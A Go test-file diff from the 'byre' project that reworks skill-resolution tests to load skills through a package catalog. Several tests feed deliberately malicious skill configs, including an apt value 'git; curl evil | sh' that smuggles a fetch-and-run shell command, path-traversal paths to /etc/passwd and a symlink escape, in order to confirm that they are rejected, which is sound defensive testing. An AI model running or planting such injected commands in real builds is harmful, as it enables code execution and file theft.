@@ -8,12 +8,33 @@ import (
 
 	"github.com/pjlsergeant/byre/internal/builtins"
 	"github.com/pjlsergeant/byre/internal/config"
+	"github.com/pjlsergeant/byre/internal/packages"
 )
 
-// writeSkill creates skillsDir/<name>/skill.toml (+ optional extra files).
-func writeSkill(t *testing.T, skillsDir, name, toml string, files map[string]string) {
+// testHome is a BYRE_HOME-shaped temp dir with an empty skills/ tree.
+func testHome(t *testing.T) string {
 	t.Helper()
-	dir := filepath.Join(skillsDir, name)
+	home := t.TempDir()
+	if err := os.MkdirAll(filepath.Join(home, "skills"), 0o755); err != nil {
+		t.Fatal(err)
+	}
+	return home
+}
+
+// catFor builds a local-only catalog for home (no bundled FS).
+func catFor(t *testing.T, home string) *packages.Catalog {
+	t.Helper()
+	cat, err := packages.LoadCatalog(home, nil, "0.2.0")
+	if err != nil {
+		t.Fatal(err)
+	}
+	return cat
+}
+
+// writeSkill creates home/skills/<name>/skill.toml (+ optional extra files).
+func writeSkill(t *testing.T, home, name, toml string, files map[string]string) {
+	t.Helper()
+	dir := filepath.Join(home, "skills", name)
 	if err := os.MkdirAll(dir, 0o755); err != nil {
 		t.Fatal(err)
 	}
@@ -62,12 +83,12 @@ target = "/home/dev/.fake"
 `
 
 func TestResolveSampleAndAgentSkills(t *testing.T) {
-	dir := t.TempDir()
+	dir := testHome(t)
 	writeSkill(t, dir, "sample", sampleSkill, nil)
 	writeSkill(t, dir, "fake", fakeAgentSkill, nil)
 
 	cfg := config.Config{Skills: []string{"sample"}, Agent: "fake"}
-	res, err := Resolve(cfg, dir)
+	res, err := Resolve(cfg, catFor(t, dir))
 	if err != nil {
 		t.Fatal(err)
 	}
@@ -97,10 +118,10 @@ func TestResolveSampleAndAgentSkills(t *testing.T) {
 // A skill's build content is held to the same anti-injection allowlists as the
 // project config (it lands in the same generated Dockerfile/shell).
 func TestResolveRejectsSkillContentInjection(t *testing.T) {
-	dir := t.TempDir()
+	dir := testHome(t)
 	writeSkill(t, dir, "evil", "[build]\napt = [\"git; curl evil | sh\"]\n", nil)
 	writeSkill(t, dir, "fake", fakeAgentSkill, nil)
-	_, err := Resolve(config.Config{Skills: []string{"evil"}, Agent: "fake"}, dir)
+	_, err := Resolve(config.Config{Skills: []string{"evil"}, Agent: "fake"}, catFor(t, dir))
 	if err == nil {
 		t.Fatal("expected rejection of shell metacharacters in skill apt package")
 	}
@@ -110,10 +131,10 @@ func TestResolveRejectsSkillContentInjection(t *testing.T) {
 // enabled as a plain skill (e.g. codex for byre-codereview) separate from the
 // launched agent, so the config UI must be able to list/toggle it.
 func TestListSkillsIncludesAgentSkills(t *testing.T) {
-	dir := t.TempDir()
+	dir := testHome(t)
 	writeSkill(t, dir, "sample", sampleSkill, nil)  // no [agent]
 	writeSkill(t, dir, "fake", fakeAgentSkill, nil) // has [agent]
-	got := ListSkills(dir)
+	got := ListSkills(catFor(t, dir))
 	want := []string{"fake", "sample"} // sorted
 	if len(got) != 2 || got[0] != want[0] || got[1] != want[1] {
 		t.Fatalf("ListSkills = %v, want %v (must include the agent skill)", got, want)
@@ -121,25 +142,25 @@ func TestListSkillsIncludesAgentSkills(t *testing.T) {
 }
 
 func TestResolveAgentMustBeAgentSkill(t *testing.T) {
-	dir := t.TempDir()
+	dir := testHome(t)
 	writeSkill(t, dir, "sample", sampleSkill, nil) // no [agent]
-	_, err := Resolve(config.Config{Agent: "sample"}, dir)
+	_, err := Resolve(config.Config{Agent: "sample"}, catFor(t, dir))
 	if err == nil {
 		t.Fatal("expected error: selected agent skill has no [agent] command")
 	}
 }
 
 func TestResolveMissingSkillErrors(t *testing.T) {
-	_, err := Resolve(config.Config{Skills: []string{"nope"}}, t.TempDir())
+	_, err := Resolve(config.Config{Skills: []string{"nope"}}, catFor(t, testHome(t)))
 	if err == nil {
 		t.Fatal("expected error for missing skill")
 	}
 }
 
 func TestResolveContextFromFile(t *testing.T) {
-	dir := t.TempDir()
+	dir := testHome(t)
 	writeSkill(t, dir, "ctx", "[context]\nfile = \"ctx.md\"\n", map[string]string{"ctx.md": "from file"})
-	res, err := Resolve(config.Config{Skills: []string{"ctx"}}, dir)
+	res, err := Resolve(config.Config{Skills: []string{"ctx"}}, catFor(t, dir))
 	if err != nil {
 		t.Fatal(err)
 	}
@@ -149,17 +170,17 @@ func TestResolveContextFromFile(t *testing.T) {
 }
 
 func TestDescriptionParsedAndListed(t *testing.T) {
-	dir := t.TempDir()
+	dir := testHome(t)
 	writeSkill(t, dir, "described", "description = \"One line about it.\"\n[build]\napt = [\"jq\"]\n", nil)
 	writeSkill(t, dir, "bare", "[build]\napt = [\"jq\"]\n", nil)
-	sk, err := Load(dir, "described")
+	sk, err := Load(catFor(t, dir), "described")
 	if err != nil {
 		t.Fatalf("Load: %v", err)
 	}
 	if sk.File.Description != "One line about it." {
 		t.Fatalf("Description = %q", sk.File.Description)
 	}
-	descs := DescribeSkills(dir)
+	descs := DescribeSkills(catFor(t, dir))
 	if descs["described"] != "One line about it." {
 		t.Fatalf("DescribeSkills[described] = %q", descs["described"])
 	}
@@ -170,42 +191,42 @@ func TestDescriptionParsedAndListed(t *testing.T) {
 }
 
 func TestLoadRejectsUnknownKey(t *testing.T) {
-	dir := t.TempDir()
+	dir := testHome(t)
 	writeSkill(t, dir, "typo", "[agent]\ncommmand = \"x\"\n", nil) // misspelled command
-	if _, err := Load(dir, "typo"); err == nil {
+	if _, err := Load(catFor(t, dir), "typo"); err == nil {
 		t.Fatal("expected unknown-key error for typo'd skill.toml")
 	}
 }
 
 func TestResolveContextFileTraversalRejected(t *testing.T) {
-	dir := t.TempDir()
+	dir := testHome(t)
 	writeSkill(t, dir, "evil", "[context]\nfile = \"../../etc/passwd\"\n", nil)
-	if _, err := Resolve(config.Config{Skills: []string{"evil"}}, dir); err == nil {
+	if _, err := Resolve(config.Config{Skills: []string{"evil"}}, catFor(t, dir)); err == nil {
 		t.Fatal("expected rejection of path-traversal context file")
 	}
 }
 
 func TestResolveContextSymlinkEscapeRejected(t *testing.T) {
-	dir := t.TempDir()
+	dir := testHome(t)
 	outside := filepath.Join(t.TempDir(), "secret")
 	if err := os.WriteFile(outside, []byte("secret"), 0o644); err != nil {
 		t.Fatal(err)
 	}
 	writeSkill(t, dir, "evil", "[context]\nfile = \"link\"\n", nil)
 	// symlink inside the skill dir pointing outside the bundle
-	if err := os.Symlink(outside, filepath.Join(dir, "evil", "link")); err != nil {
+	if err := os.Symlink(outside, filepath.Join(dir, "skills", "evil", "link")); err != nil {
 		t.Fatal(err)
 	}
-	if _, err := Resolve(config.Config{Skills: []string{"evil"}}, dir); err == nil {
+	if _, err := Resolve(config.Config{Skills: []string{"evil"}}, catFor(t, dir)); err == nil {
 		t.Fatal("expected rejection of symlink escaping the skill dir")
 	}
 }
 
 func TestResolveAgentStateMustBeContributed(t *testing.T) {
-	dir := t.TempDir()
+	dir := testHome(t)
 	// declares state ".claude" but contributes no such state volume
 	writeSkill(t, dir, "claudish", "[agent]\ncommand = \"claude\"\nstate = \".claude\"\n", nil)
-	if _, err := Resolve(config.Config{Agent: "claudish"}, dir); err == nil {
+	if _, err := Resolve(config.Config{Agent: "claudish"}, catFor(t, dir)); err == nil {
 		t.Fatal("expected error: agent.state names no contributed state volume")
 	}
 }
@@ -227,9 +248,9 @@ target = "/home/dev/.fake"
 `
 
 func TestResolvePrefsCollected(t *testing.T) {
-	dir := t.TempDir()
+	dir := testHome(t)
 	writeSkill(t, dir, "fake", agentWithPrefs, nil)
-	res, err := Resolve(config.Config{Agent: "fake"}, dir)
+	res, err := Resolve(config.Config{Agent: "fake"}, catFor(t, dir))
 	if err != nil {
 		t.Fatal(err)
 	}
@@ -242,10 +263,10 @@ func TestResolvePrefsCollected(t *testing.T) {
 }
 
 func TestResolvePrefsRequireState(t *testing.T) {
-	dir := t.TempDir()
+	dir := testHome(t)
 	// prefs but no [agent].state -> nowhere to seed -> error.
 	writeSkill(t, dir, "fake", "[agent]\ncommand = \"x\"\n[agent.prefs]\nfrom = \"~/.fake\"\nfiles = [\"a\"]\n", nil)
-	if _, err := Resolve(config.Config{Agent: "fake"}, dir); err == nil {
+	if _, err := Resolve(config.Config{Agent: "fake"}, catFor(t, dir)); err == nil {
 		t.Fatal("expected error: prefs require a state volume")
 	}
 }
@@ -255,29 +276,29 @@ func TestResolvePrefsRejectsEscapingFile(t *testing.T) {
 	toml := "[agent]\ncommand = \"x\"\nstate = \".fake\"\n[agent.prefs]\nfrom = \"~/.fake\"\nfiles = [\"../../etc/passwd\"]\n" +
 		"[[volumes]]\nname = \".fake\"\nrole = \"state\"\ntarget = \"/home/dev/.fake\"\n"
 	writeSkill(t, dir, "fake", toml, nil)
-	if _, err := Resolve(config.Config{Agent: "fake"}, dir); err == nil {
+	if _, err := Resolve(config.Config{Agent: "fake"}, catFor(t, dir)); err == nil {
 		t.Fatal("expected error: prefs file escapes from-dir")
 	}
 }
 
 func TestResolvePrefsRejectsWholeDir(t *testing.T) {
-	dir := t.TempDir()
+	dir := testHome(t)
 	// files = ["."] would copy the entire from-dir (incl. secret-bearing files);
 	// must be rejected so curation can't be bypassed.
 	for _, bad := range []string{".", "./", "x/.."} {
 		toml := "[agent]\ncommand = \"x\"\nstate = \".fake\"\n[agent.prefs]\nfrom = \"~/.fake\"\nfiles = [\"" + bad + "\"]\n" +
 			"[[volumes]]\nname = \".fake\"\nrole = \"state\"\ntarget = \"/home/dev/.fake\"\n"
 		writeSkill(t, dir, "fake", toml, nil)
-		if _, err := Resolve(config.Config{Agent: "fake"}, dir); err == nil {
+		if _, err := Resolve(config.Config{Agent: "fake"}, catFor(t, dir)); err == nil {
 			t.Fatalf("expected rejection of prefs file %q (whole-dir copy)", bad)
 		}
 	}
 }
 
 func TestResolveNoAgent(t *testing.T) {
-	dir := t.TempDir()
+	dir := testHome(t)
 	writeSkill(t, dir, "sample", sampleSkill, nil)
-	res, err := Resolve(config.Config{Skills: []string{"sample"}}, dir)
+	res, err := Resolve(config.Config{Skills: []string{"sample"}}, catFor(t, dir))
 	if err != nil {
 		t.Fatal(err)
 	}
@@ -296,7 +317,7 @@ files = { "review.sh" = "/usr/local/bin/byre-review", "lib/helper.sh" = "/opt/he
 		"review.sh":     "#!/bin/sh\necho review\n",
 		"lib/helper.sh": "echo help\n",
 	})
-	res, err := Resolve(config.Config{Skills: []string{"tools"}}, dir)
+	res, err := Resolve(config.Config{Skills: []string{"tools"}}, catFor(t, dir))
 	if err != nil {
 		t.Fatal(err)
 	}
@@ -317,18 +338,18 @@ files = { "review.sh" = "/usr/local/bin/byre-review", "lib/helper.sh" = "/opt/he
 }
 
 func TestResolveSkillFilesRejectsRelativeDest(t *testing.T) {
-	dir := t.TempDir()
+	dir := testHome(t)
 	writeSkill(t, dir, "bad", "[build]\nfiles = { \"x.sh\" = \"relative/dest\" }\n",
 		map[string]string{"x.sh": "x\n"})
-	if _, err := Resolve(config.Config{Skills: []string{"bad"}}, dir); err == nil {
+	if _, err := Resolve(config.Config{Skills: []string{"bad"}}, catFor(t, dir)); err == nil {
 		t.Fatal("expected rejection of non-absolute file destination")
 	}
 }
 
 func TestResolveSkillFilesRejectsEscape(t *testing.T) {
-	dir := t.TempDir()
+	dir := testHome(t)
 	writeSkill(t, dir, "bad", "[build]\nfiles = { \"../escape.sh\" = \"/x.sh\" }\n", nil)
-	if _, err := Resolve(config.Config{Skills: []string{"bad"}}, dir); err == nil {
+	if _, err := Resolve(config.Config{Skills: []string{"bad"}}, catFor(t, dir)); err == nil {
 		t.Fatal("expected rejection of source escaping the skill dir")
 	}
 }
@@ -348,7 +369,7 @@ role = "state"
 target = "/home/dev/.fake"
 `
 	writeSkill(t, dir, "fake", toml, nil)
-	res, err := Resolve(config.Config{Agent: "fake"}, dir)
+	res, err := Resolve(config.Config{Agent: "fake"}, catFor(t, dir))
 	if err != nil {
 		t.Fatal(err)
 	}
@@ -373,14 +394,14 @@ role = "state"
 target = "/home/dev/.fake"
 `
 	writeSkill(t, dir, "fake", toml, nil)
-	if _, err := Resolve(config.Config{Agent: "fake"}, dir); err == nil {
+	if _, err := Resolve(config.Config{Agent: "fake"}, catFor(t, dir)); err == nil {
 		t.Fatal("expected rejection of non-absolute context_target")
 	}
 }
 
 func TestResolveRejectsUnsafeSkillName(t *testing.T) {
 	dir := t.TempDir()
-	if _, err := Resolve(config.Config{Skills: []string{"../evil"}}, dir); err == nil {
+	if _, err := Resolve(config.Config{Skills: []string{"../evil"}}, catFor(t, dir)); err == nil {
 		t.Fatal("expected rejection of skill name with path separator")
 	}
 }
@@ -398,7 +419,7 @@ role = "state"
 target = "/home/dev/.fake"
 `
 	writeSkill(t, dir, "fake", toml, nil)
-	if _, err := Resolve(config.Config{Agent: "fake"}, dir); err == nil {
+	if _, err := Resolve(config.Config{Agent: "fake"}, catFor(t, dir)); err == nil {
 		t.Fatal("expected rejection of context_target outside /home/dev")
 	}
 }
@@ -416,16 +437,16 @@ role = "state"
 target = "/home/dev/.fake"
 `
 	writeSkill(t, dir, "fake", toml, nil)
-	if _, err := Resolve(config.Config{Agent: "fake"}, dir); err == nil {
+	if _, err := Resolve(config.Config{Agent: "fake"}, catFor(t, dir)); err == nil {
 		t.Fatal("expected rejection of context_target == /home/dev (not a file)")
 	}
 }
 
 func TestResolveRejectsCrossSkillEnvConflict(t *testing.T) {
-	dir := t.TempDir()
+	dir := testHome(t)
 	writeSkill(t, dir, "a", "[runtime]\nenv = { EDITOR = \"vim\" }\n", nil)
 	writeSkill(t, dir, "b", "[runtime]\nenv = { EDITOR = \"emacs\" }\n", nil)
-	_, err := Resolve(config.Config{Skills: []string{"a", "b"}}, dir)
+	_, err := Resolve(config.Config{Skills: []string{"a", "b"}}, catFor(t, dir))
 	if err == nil {
 		t.Fatal("expected an error for a cross-skill env conflict")
 	}
@@ -438,10 +459,10 @@ func TestResolveRejectsCrossSkillEnvConflict(t *testing.T) {
 }
 
 func TestResolveAllowsIdenticalEnvAcrossSkills(t *testing.T) {
-	dir := t.TempDir()
+	dir := testHome(t)
 	writeSkill(t, dir, "a", "[runtime]\nenv = { EDITOR = \"vim\" }\n", nil)
 	writeSkill(t, dir, "b", "[runtime]\nenv = { EDITOR = \"vim\" }\n", nil)
-	res, err := Resolve(config.Config{Skills: []string{"a", "b"}}, dir)
+	res, err := Resolve(config.Config{Skills: []string{"a", "b"}}, catFor(t, dir))
 	if err != nil {
 		t.Fatalf("identical values are order-independent and must be allowed: %v", err)
 	}
@@ -451,10 +472,10 @@ func TestResolveAllowsIdenticalEnvAcrossSkills(t *testing.T) {
 }
 
 func TestGrantsAttributeRunArgs(t *testing.T) {
-	dir := t.TempDir()
+	dir := testHome(t)
 	writeSkill(t, dir, "danger", "[runtime]\nrun_args = [\"--privileged\"]\n", nil)
 	writeSkill(t, dir, "plain", "[build]\napt = [\"jq\"]\n", nil)
-	res, err := Resolve(config.Config{Skills: []string{"danger", "plain"}}, dir)
+	res, err := Resolve(config.Config{Skills: []string{"danger", "plain"}}, catFor(t, dir))
 	if err != nil {
 		t.Fatal(err)
 	}
@@ -468,9 +489,9 @@ func TestGrantsAttributeRunArgs(t *testing.T) {
 }
 
 func TestResolveNetworkPostureAndNetnsInit(t *testing.T) {
-	dir := t.TempDir()
+	dir := testHome(t)
 	writeSkill(t, dir, "fw", "[runtime]\nnetwork_posture = \"deny-by-default\"\nnetns_init = \"/usr/local/bin/byre-firewall\"\n", nil)
-	res, err := Resolve(config.Config{Skills: []string{"fw"}}, dir)
+	res, err := Resolve(config.Config{Skills: []string{"fw"}}, catFor(t, dir))
 	if err != nil {
 		t.Fatal(err)
 	}
@@ -490,9 +511,9 @@ func TestResolveNetworkPostureAndNetnsInit(t *testing.T) {
 }
 
 func TestResolveNoPostureMeansOpen(t *testing.T) {
-	dir := t.TempDir()
+	dir := testHome(t)
 	writeSkill(t, dir, "plain", "[build]\napt = [\"jq\"]\n", nil)
-	res, err := Resolve(config.Config{Skills: []string{"plain"}}, dir)
+	res, err := Resolve(config.Config{Skills: []string{"plain"}}, catFor(t, dir))
 	if err != nil {
 		t.Fatal(err)
 	}
@@ -502,10 +523,10 @@ func TestResolveNoPostureMeansOpen(t *testing.T) {
 }
 
 func TestResolveRejectsConflictingPostures(t *testing.T) {
-	dir := t.TempDir()
+	dir := testHome(t)
 	writeSkill(t, dir, "fw1", "[runtime]\nnetwork_posture = \"deny-by-default\"\n", nil)
 	writeSkill(t, dir, "fw2", "[runtime]\nnetwork_posture = \"deny-by-default\"\n", nil)
-	_, err := Resolve(config.Config{Skills: []string{"fw1", "fw2"}}, dir)
+	_, err := Resolve(config.Config{Skills: []string{"fw1", "fw2"}}, catFor(t, dir))
 	if err == nil {
 		t.Fatal("two skills declaring a posture must be rejected (even identical: each claims the stance)")
 	}
@@ -517,30 +538,30 @@ func TestResolveRejectsConflictingPostures(t *testing.T) {
 }
 
 func TestResolveRejectsMalformedPosture(t *testing.T) {
-	dir := t.TempDir()
+	dir := testHome(t)
 	// Status prints the posture verbatim; a spoofing label must be rejected.
 	writeSkill(t, dir, "fw", "[runtime]\nnetwork_posture = \"open  (all good)\"\n", nil)
-	if _, err := Resolve(config.Config{Skills: []string{"fw"}}, dir); err == nil {
+	if _, err := Resolve(config.Config{Skills: []string{"fw"}}, catFor(t, dir)); err == nil {
 		t.Fatal("posture with spaces/parens must be rejected")
 	}
 }
 
 func TestResolveRejectsRelativeNetnsInit(t *testing.T) {
-	dir := t.TempDir()
+	dir := testHome(t)
 	writeSkill(t, dir, "fw", "[runtime]\nnetns_init = \"bin/fw\"\n", nil)
-	if _, err := Resolve(config.Config{Skills: []string{"fw"}}, dir); err == nil {
+	if _, err := Resolve(config.Config{Skills: []string{"fw"}}, catFor(t, dir)); err == nil {
 		t.Fatal("relative netns_init must be rejected")
 	}
 }
 
 func TestResolveRejectsTwoNetnsInits(t *testing.T) {
-	dir := t.TempDir()
+	dir := testHome(t)
 	// The launch gate is opened by the hook's own script, so a second hook
 	// could run after the agent was already released — refuse the ambiguity
 	// (same stance as two posture declarations).
 	writeSkill(t, dir, "fw1", "[runtime]\nnetns_init = \"/usr/local/bin/fw1\"\n", nil)
 	writeSkill(t, dir, "fw2", "[runtime]\nnetns_init = \"/usr/local/bin/fw2\"\n", nil)
-	_, err := Resolve(config.Config{Skills: []string{"fw1", "fw2"}}, dir)
+	_, err := Resolve(config.Config{Skills: []string{"fw1", "fw2"}}, catFor(t, dir))
 	if err == nil {
 		t.Fatal("two skills declaring a netns_init must be rejected")
 	}
@@ -552,10 +573,10 @@ func TestResolveRejectsTwoNetnsInits(t *testing.T) {
 }
 
 func TestEgressUnionAndAttribution(t *testing.T) {
-	dir := t.TempDir()
+	dir := testHome(t)
 	writeSkill(t, dir, "claude", "[runtime]\negress = [\"api.anthropic.com\", \"claude.ai\"]\n", nil)
 	writeSkill(t, dir, "fw", "[runtime]\nnetwork_posture = \"deny-by-default\"\negress = [\"github.com\", \"deb.debian.org:80\", \"api.anthropic.com\"]\n", nil)
-	res, err := Resolve(config.Config{Skills: []string{"claude", "fw"}}, dir)
+	res, err := Resolve(config.Config{Skills: []string{"claude", "fw"}}, catFor(t, dir))
 	if err != nil {
 		t.Fatal(err)
 	}
@@ -587,7 +608,7 @@ func TestEgressRejectsMalformed(t *testing.T) {
 	for _, bad := range []string{"api.anthropic.com:99999", "has space.com", "host:notaport:443", "bad;host"} {
 		dir := t.TempDir()
 		writeSkill(t, dir, "fw", "[runtime]\negress = [\""+bad+"\"]\n", nil)
-		if _, err := Resolve(config.Config{Skills: []string{"fw"}}, dir); err == nil {
+		if _, err := Resolve(config.Config{Skills: []string{"fw"}}, catFor(t, dir)); err == nil {
 			t.Errorf("egress %q must be rejected", bad)
 		}
 	}
@@ -606,18 +627,18 @@ func TestEgressPortDefaultsTo443(t *testing.T) {
 // that agent's shared-auth companion (shared_auth_for). No declaration — a
 // broken or gate-pending companion — means no onboarding offer.
 func TestSharedAuthCompanion(t *testing.T) {
-	dir := t.TempDir()
+	dir := testHome(t)
 	writeSkill(t, dir, "claude", "[agent]\ncommand = \"claude\"\nstate = \"s\"\n\n[[volumes]]\nname = \"s\"\nrole = \"state\"\ntarget = \"/home/dev/.claude\"\n", nil)
 	writeSkill(t, dir, "claude-shared-auth", "shared_auth_for = \"claude\"\n", nil)
 	writeSkill(t, dir, "grok-shared-auth", "description = \"RETIRED — no shared_auth_for, so never offered\"\n", nil)
 
-	if got := SharedAuthCompanion(dir, "claude"); got != "claude-shared-auth" {
+	if got := SharedAuthCompanion(catFor(t, dir), "claude"); got != "claude-shared-auth" {
 		t.Fatalf("SharedAuthCompanion(claude) = %q, want claude-shared-auth", got)
 	}
-	if got := SharedAuthCompanion(dir, "grok"); got != "" {
+	if got := SharedAuthCompanion(catFor(t, dir), "grok"); got != "" {
 		t.Fatalf("an undeclared companion must not be offered, got %q", got)
 	}
-	if got := SharedAuthCompanion(dir, ""); got != "" {
+	if got := SharedAuthCompanion(catFor(t, dir), ""); got != "" {
 		t.Fatalf("no agent, no companion, got %q", got)
 	}
 }
@@ -625,17 +646,18 @@ func TestSharedAuthCompanion(t *testing.T) {
 // The builtin declarations are load-bearing: claude/codex offer at onboarding;
 // gemini (OAuth gate-pending) and grok (retired) deliberately must NOT.
 func TestBuiltinSharedAuthDeclarations(t *testing.T) {
-	dir := filepath.Join(t.TempDir(), "skills")
-	if err := builtins.MaterializeSkills(dir); err != nil {
+	home := t.TempDir()
+	cat, err := packages.LoadCatalog(home, builtins.FS(), "0.2.0")
+	if err != nil {
 		t.Fatal(err)
 	}
 	for agent, want := range map[string]string{
 		"claude": "claude-shared-auth",
 		"codex":  "codex-shared-auth",
-		"gemini": "", // OAuth gate-pending (see gemini-shared-auth/skill.toml)
+		"gemini": "", // OAuth gate-pending (no shared_auth_for)
 		"grok":   "", // retired (see grok-shared-auth/skill.toml)
 	} {
-		if got := SharedAuthCompanion(dir, agent); got != want {
+		if got := SharedAuthCompanion(cat, agent); got != want {
 			t.Errorf("SharedAuthCompanion(%s) = %q, want %q", agent, got, want)
 		}
 	}
@@ -644,16 +666,16 @@ func TestBuiltinSharedAuthDeclarations(t *testing.T) {
 // Two skills claiming the same agent is refused (no offer), not resolved by
 // sort order — a hand-dropped near-namesake must not shadow the builtin.
 func TestSharedAuthCompanionRefusesAmbiguity(t *testing.T) {
-	dir := t.TempDir()
+	dir := testHome(t)
 	writeSkill(t, dir, "aa-auth", "shared_auth_for = \"claude\"\n", nil)
 	writeSkill(t, dir, "claude-shared-auth", "shared_auth_for = \"claude\"\n", nil)
-	if got := SharedAuthCompanion(dir, "claude"); got != "" {
+	if got := SharedAuthCompanion(catFor(t, dir), "claude"); got != "" {
 		t.Fatalf("two declarers must yield no companion, got %q", got)
 	}
 }
 
 func TestResolveSockGroupsAndContainment(t *testing.T) {
-	dir := t.TempDir()
+	dir := testHome(t)
 	writeSkill(t, dir, "dh", `
 [runtime]
 mounts = [{ host = "/var/run/docker.sock", target = "/var/run/docker.sock", mode = "rw" }]
@@ -661,7 +683,7 @@ sock_groups = ["/var/run/docker.sock"]
 containment = "docker-host opens a containment hole -- skim docs/docker-host.md"
 egress = []
 `, nil)
-	res, err := Resolve(config.Config{Skills: []string{"dh"}}, dir)
+	res, err := Resolve(config.Config{Skills: []string{"dh"}}, catFor(t, dir))
 	if err != nil {
 		t.Fatal(err)
 	}
@@ -683,14 +705,14 @@ egress = []
 }
 
 func TestResolveMultiContainment(t *testing.T) {
-	dir := t.TempDir()
+	dir := testHome(t)
 	writeSkill(t, dir, "a", `[runtime]
 containment = "hole A"
 `, nil)
 	writeSkill(t, dir, "b", `[runtime]
 containment = "hole B"
 `, nil)
-	res, err := Resolve(config.Config{Skills: []string{"a", "b"}}, dir)
+	res, err := Resolve(config.Config{Skills: []string{"a", "b"}}, catFor(t, dir))
 	if err != nil {
 		t.Fatal(err)
 	}
@@ -701,33 +723,33 @@ containment = "hole B"
 }
 
 func TestResolveRejectsSockGroupsWithoutMount(t *testing.T) {
-	dir := t.TempDir()
+	dir := testHome(t)
 	writeSkill(t, dir, "dh", `[runtime]
 sock_groups = ["/var/run/docker.sock"]
 `, nil)
-	if _, err := Resolve(config.Config{Skills: []string{"dh"}}, dir); err == nil {
+	if _, err := Resolve(config.Config{Skills: []string{"dh"}}, catFor(t, dir)); err == nil {
 		t.Fatal("sock_groups without matching mount target must be rejected")
 	}
 }
 
 func TestResolveRejectsRelativeSockGroup(t *testing.T) {
-	dir := t.TempDir()
+	dir := testHome(t)
 	// sock_groups path is relative; rejected regardless of mounts.
 	writeSkill(t, dir, "dh", `[runtime]
 mounts = [{ host = "/h", target = "/t", mode = "rw" }]
 sock_groups = ["relative"]
 `, nil)
-	if _, err := Resolve(config.Config{Skills: []string{"dh"}}, dir); err == nil {
+	if _, err := Resolve(config.Config{Skills: []string{"dh"}}, catFor(t, dir)); err == nil {
 		t.Fatal("relative sock_groups path must be rejected")
 	}
 }
 
 func TestResolveRejectsContainmentNewline(t *testing.T) {
-	dir := t.TempDir()
+	dir := testHome(t)
 	// Literal newline inside the TOML string is invalid TOML; use the escaped
 	// form so Load succeeds and validateContainment rejects the decoded value.
 	writeSkill(t, dir, "dh", "[runtime]\ncontainment = \"hole\\nNetwork: open\"\n", nil)
-	if _, err := Resolve(config.Config{Skills: []string{"dh"}}, dir); err == nil {
+	if _, err := Resolve(config.Config{Skills: []string{"dh"}}, catFor(t, dir)); err == nil {
 		t.Fatal("containment with newline must be rejected")
 	}
 }
@@ -745,7 +767,7 @@ func TestResolveRejectsContainmentTooLong(t *testing.T) {
 	dir := t.TempDir()
 	long := strings.Repeat("x", containmentMaxLen+1)
 	writeSkill(t, dir, "dh", "[runtime]\ncontainment = \""+long+"\"\n", nil)
-	if _, err := Resolve(config.Config{Skills: []string{"dh"}}, dir); err == nil {
+	if _, err := Resolve(config.Config{Skills: []string{"dh"}}, catFor(t, dir)); err == nil {
 		t.Fatal("overlong containment must be rejected")
 	}
 }
